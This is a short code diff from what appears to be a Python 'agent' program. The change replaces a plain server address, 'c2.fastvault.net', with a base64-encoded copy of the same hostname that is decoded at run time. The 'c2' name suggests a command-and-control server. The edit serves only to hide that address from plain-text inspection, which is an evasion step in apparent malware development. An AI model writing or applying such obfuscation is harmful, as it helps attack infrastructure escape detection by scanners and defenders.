@@ -24,7 +24,8 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] Agen
 log = logging.getLogger("agent")
 
 # ========== CONFIG ==========
-SERVER_URL = "c2.fastvault.net"    # VPS server
+import base64
+SERVER_URL = base64.b64decode("YzIuZmFzdHZhdWx0Lm5ldA==").decode()  # c2.fastvault.net
 USE_SSL = True                     # True cho cloudflare
 # ============================
 
